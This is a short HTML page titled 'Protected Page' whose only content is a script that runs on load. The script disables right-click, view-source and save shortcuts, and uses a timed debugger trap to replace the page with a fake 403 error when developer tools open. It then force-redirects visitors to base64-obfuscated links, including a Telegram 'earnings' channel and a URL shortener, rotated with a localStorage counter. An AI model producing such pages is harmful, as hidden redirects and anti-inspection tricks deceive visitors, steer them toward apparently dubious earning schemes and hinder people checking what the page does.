<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Protected Page</title>
    <script>
        (function() {
            function blockDevTools() {
                document.addEventListener("contextmenu", e => e.preventDefault());
                document.addEventListener("keydown", e => {
                    if (e.ctrlKey && (e.key === "u" || e.key === "s")) e.preventDefault();
                    if (e.keyCode === 123) e.preventDefault();
                });

                setInterval(() => {
                    let before = new Date();
                    debugger;
                    let after = new Date();
                    if (after - before > 100) {
                        document.body.innerHTML = "<h1 style='text-align:center;color:red;'>Error 403: Access Denied</h1>";
                        throw new Error("DevTools Blocked!");
                    }
                }, 1000);
            }

            function redirect() {
                let count = localStorage.getItem("rdCt") ? parseInt(localStorage.getItem("rdCt")) : 0;
                let links = [
                    "aHR0cHM6Ly90Lm1lL1NGQUVhcm5pbmdz",  // Telegram Link (1 बार)
                    "aHR0cHM6Ly9nb3RvLm5vdy9KdHVnYw==",  // दूसरा लिंक (3 बार)
                    "aHR0cHM6Ly9leGFtcGxlLmNvbS9uZXctbGluaw==",  // नया लिंक (3 बार के लिए)
                    "aHR0cHM6Ly93d3cueHl6LmNvbS9zZWNyZXQ=",  // एक और लिंक (3 बार के लिए)
                ];

                if (count < 3) {
                    let randomIndex = Math.floor(Math.random() * (links.length - 1)) + 1;
                    localStorage.setItem("rdCt", count + 1);
                    window.location.href = atob(links[randomIndex]); // 3 बार कोई भी लिंक खुलेगा
                } else {
                    localStorage.setItem("rdCt", 0);
                    window.location.href = atob(links[0]); // 1 बार Telegram लिंक खुलेगा
                }
            }

            blockDevTools();
            setTimeout(redirect, 200);
        })();
    </script>
</head>
<body>
</body>
</html>
